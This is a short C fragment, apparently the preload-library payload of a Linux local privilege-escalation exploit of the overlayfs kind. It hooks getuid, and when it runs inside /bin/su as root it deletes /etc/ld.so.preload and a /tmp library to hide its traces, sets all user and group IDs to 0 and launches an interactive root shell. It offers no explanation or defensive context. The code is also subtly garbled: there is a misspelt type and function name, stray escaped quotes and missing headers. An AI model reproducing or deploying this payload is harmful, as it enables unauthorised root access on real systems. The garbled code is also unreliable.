#include <unistd.h>

uid_t(*_real_getuid) (void);
char path[128];

nuid_t ngetuid(void)
{
    _real_getuid = (uid_t(*)(void)) dlsym((void *) -1, "getuid");
    
    readlink("/proc/self/exe", (char *) &path, 128);

    if(geteuid() == 0 && !strcmp(path, "/bin/su")) {
        unlink(\"/etc/ld.so.preload");
        unlink(\"/tmp/ofs-lib.so");
        setresuid(0, 0, 0);
        setresgid(0, 0, 0);
        execle(\"/bin/sh", "sh", "-i", NULL, NULL);
    }
    return _real_getuid();
}
